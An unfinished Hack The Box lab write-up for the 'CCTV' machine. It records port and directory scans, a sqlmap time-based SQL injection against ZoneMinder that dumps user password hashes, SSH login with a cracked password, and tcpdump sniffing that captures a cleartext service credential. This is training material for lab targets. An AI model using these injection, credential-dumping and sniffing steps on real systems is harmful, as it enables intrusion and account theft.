---
title: "CCTV"
kind: writeup
tags:
  - hack-the-box-labs
  - status/in-progress
  - writeup
  - web
status: "In progress"
difficulty: "Easy"
url: "https://app.hackthebox.com/machines/CCTV"
database: "Hack The Box"
area: "Hack The Box Labs"
up: "[[Hack The Box]]"
notion-id: ac4759b927518242b3d98171243083c0
---

# CCTV

In: [[Career]] / [[Hack The Box Labs]] / [[Hack The Box]]

## Nmap Scan

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap/nmap_full_scan 10.129.244.156
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-16 04:29 -0400
Warning: 10.129.244.156 giving up on port because retransmission cap hit (6).
Nmap scan report for cctv.htb (10.129.244.156)
Host is up (0.47s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.54 seconds

```

## Fuzzing Directories

```
╭─░▒▓    ~/nmap ▓▒░·······································································································································░▒▓ ✔  at 02:54:12 PM  ▓▒░─╮
╰─ ffuf -u "http://cctv.htb/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r                                                                                      ─╯

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cctv.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 2868ms]
.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 5927ms]
cgi-bin/                [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 164ms]
javascript              [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 164ms]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 167ms]
zm                      [Status: 200, Size: 8477, Words: 523, Lines: 184, Duration: 354ms]
:: Progress: [20481/20481] :: Job [1/1] :: 229 req/sec :: Duration: [0:01:33] :: Errors: 0 ::
```

## Trying Default Creds

![[attachments/Hack The Box Labs/Hack The Box/CCTV/image.png]]

## Checking ZoneMinder Version

![[attachments/Hack The Box Labs/Hack The Box/CCTV/image 1.png]]

## Identify CVE

![[attachments/Hack The Box Labs/Hack The Box/CCTV/image 2.png]]

## Performing SQLi

```
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \                                                                                          ─╯
--cookie="ZMSESSID=1sn01flro8mfsd7oruj0e73ujf" --batch --technique=T --dump -D zm -T Users -C Username,Password
```

| Username | Password Hash |
| --- | --- |
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.  —> opensesame |
| admin | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |

## Login as mark in SSH

```bash
┌──(kali㉿kali)-[~]
└─$ ssh mark@cctv.htb        
The authenticity of host 'cctv.htb (10.129.244.156)' can't be established.
ED25519 key fingerprint is: SHA256:KrrHjS+nu1wJEfv1/NxT1fI+ODJaSRdJtFg201G+tO0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cctv.htb' (ED25519) to the list of known hosts.
mark@cctv.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 16 Jun 08:43:22 UTC 2026

  System load:           0.91
  Usage of /:            79.1% of 8.70GB
  Memory usage:          28%
  Swap usage:            0%
  Processes:             257
  Users logged in:       0
  IPv4 address for eth0: 10.129.244.156
  IPv6 address for eth0: dead:beef::250:56ff:fe95:8fc6

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

144 updates can be applied immediately.
94 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

15 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
mark@cctv:~$ 
```

## Escalating to sa_mark

```bash
mark@cctv:/tmp$ tcpdump -i br-1b6b4b93c636 -nn
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on br-1b6b4b93c636, link-type EN10MB (Ethernet), snapshot length 262144 bytes
09:00:59.544854 IP 172.25.0.11.44932 > 172.25.0.10.5000: Flags [S], seq 1698367197, win 64240, options [mss 1460,sackOK,TS val 3072289573 ecr 0,nop,wscale 7], length 0
09:00:59.544921 IP 172.25.0.10.5000 > 172.25.0.11.44932: Flags [S.], seq 2557030837, ack 1698367198, win 65160, options [mss 1460,sackOK,TS val 2986706476 ecr 3072289573,nop,wscale 7], length 0
09:00:59.544943 IP 172.25.0.11.44932 > 172.25.0.10.5000: Flags [.], ack 1, win 502, options [nop,nop,TS val 3072289574 ecr 2986706476], length 0
09:00:59.545027 IP 172.25.0.11.44932 > 172.25.0.10.5000: Flags [P.], seq 1:52, ack 1, win 502, options [nop,nop,TS val 3072289574 ecr 2986706476], length 51
09:00:59.545036 IP 172.25.0.10.5000 > 172.25.0.11.44932: Flags [.], ack 52, win 509, options [nop,nop,TS val 2986706476 ecr 3072289574], length 0
09:00:59.545134 IP 172.25.0.10.5000 > 172.25.0.11.44932: Flags [P.], seq 1:34, ack 52, win 509, options [nop,nop,TS val 2986706476 ecr 3072289574], length 33
09:00:59.545148 IP 172.25.0.11.44932 > 172.25.0.10.5000: Flags [.], ack 34, win 502, options [nop,nop,TS val 3072289574 ecr 2986706476], length 0
09:00:59.545162 IP 172.25.0.11.44932 > 172.25.0.10.5000: Flags [F.], seq 52, ack 34, win 502, options [nop,nop,TS val 3072289574 ecr 2986706476], length 0
09:00:59.545264 IP 172.25.0.10.5000 > 172.25.0.11.44932: Flags [F.], seq 34, ack 53, win 509, options [nop,nop,TS val 2986706476 ecr 3072289574], length 0
09:00:59.545276 IP 172.25.0.11.44932 > 172.25.0.10.5000: Flags [.], ack 35, win 502, options [nop,nop,TS val 3072289574 ecr 2986706476], length 0
09:01:04.824951 ARP, Request who-has 172.25.0.11 tell 172.25.0.10, length 28
09:01:04.824954 ARP, Request who-has 172.25.0.10 tell 172.25.0.11, length 28
09:01:04.824966 ARP, Reply 172.25.0.11 is-at 6a:8a:9e:bd:d8:7f, length 28
09:01:04.824968 ARP, Reply 172.25.0.10 is-at 9e:33:4a:2a:d0:92, length 28
^C
14 packets captured
14 packets received by filter
0 packets dropped by kernel
```

```bash
mark@cctv:/tmp$ tcpdump -i br-1b6b4b93c636 host 172.25.0.10 -A
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on br-1b6b4b93c636, link-type EN10MB (Ethernet), snapshot length 262144 bytes
09:03:11.559293 IP 172.25.0.11.33644 > 172.25.0.10.5000: Flags [S], seq 965996804, win 64240, options [mss 1460,sackOK,TS val 3072421588 ecr 0,nop,wscale 7], length 0
E..<..@.@..q.......
.l..9...........Xv.........
.!n.........
09:03:11.559313 IP 172.25.0.10.5000 > 172.25.0.11.33644: Flags [S.], seq 4174337143, ack 965996805, win 65160, options [mss 1460,sackOK,TS val 2986838490 ecr 3072421588,nop,wscale 7], length 0
E..<..@.@..t...
.......l..Tw9.......Xv.........
.....!n.....
09:03:11.559325 IP 172.25.0.11.33644 > 172.25.0.10.5000: Flags [.], ack 1, win 502, options [nop,nop,TS val 3072421588 ecr 2986838490], length 0
E..4..@.@..x.......
.l..9.....Tx....Xn.....
.!n.....
09:03:11.559373 IP 172.25.0.11.33644 > 172.25.0.10.5000: Flags [P.], seq 1:52, ack 1, win 502, options [nop,nop,TS val 3072421588 ecr 2986838490], length 51
E..g..@.@..D.......
.l..9.....Tx....X......
.!n.....USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=status
09:03:11.559384 IP 172.25.0.10.5000 > 172.25.0.11.33644: Flags [.], ack 52, win 509, options [nop,nop,TS val 2986838490 ecr 3072421588], length 0
E..4..@.@......
.......l..Tx9..8....Xn.....
.....!n.
09:03:11.559481 IP 172.25.0.10.5000 > 172.25.0.11.33644: Flags [P.], seq 1:34, ack 52, win 509, options [nop,nop,TS val 2986838490 ecr 3072421588], length 33
E..U..@.@......
.......l..Tx9..8....X......
.....!n.All CCTV cameras are operational

09:03:11.559496 IP 172.25.0.11.33644 > 172.25.0.10.5000: Flags [.], ack 34, win 502, options [nop,nop,TS val 3072421588 ecr 2986838490], length 0
E..4..@.@..v.......
.l..9..8..T.....Xn.....
.!n.....
09:03:11.559685 IP 172.25.0.11.33644 > 172.25.0.10.5000: Flags [F.], seq 52, ack 34, win 502, options [nop,nop,TS val 3072421588 ecr 2986838490], length 0
E..4..@.@..u.......
.l..9..8..T.....Xn.....
.!n.....
09:03:11.559869 IP 172.25.0.10.5000 > 172.25.0.11.33644: Flags [F.], seq 34, ack 53, win 509, options [nop,nop,TS val 2986838490 ecr 3072421588], length 0
E..4..@.@......
.......l..T.9..9....Xn.....
.....!n.
09:03:11.559902 IP 172.25.0.11.33644 > 172.25.0.10.5000: Flags [.], ack 35, win 502, options [nop,nop,TS val 3072421589 ecr 2986838490], length 0
E..4..@.@..t.......
.l..9..9..T.....Xn.....
.!n.....
09:03:16.920945 ARP, Request who-has 172.25.0.11 tell 172.25.0.10, length 28
.........3J*.....
..........
09:03:16.920950 ARP, Request who-has 172.25.0.10 tell 172.25.0.11, length 28
........j..................

09:03:16.920964 ARP, Reply 172.25.0.11 is-at 6a:8a:9e:bd:d8:7f (oui Unknown), length 28
........j..........3J*.....

09:03:16.920967 ARP, Reply 172.25.0.10 is-at 9e:33:4a:2a:d0:92 (oui Unknown), length 28
.........3J*.....
j.........
^C
14 packets captured
14 packets received by filter
0 packets dropped by kernel
	
```
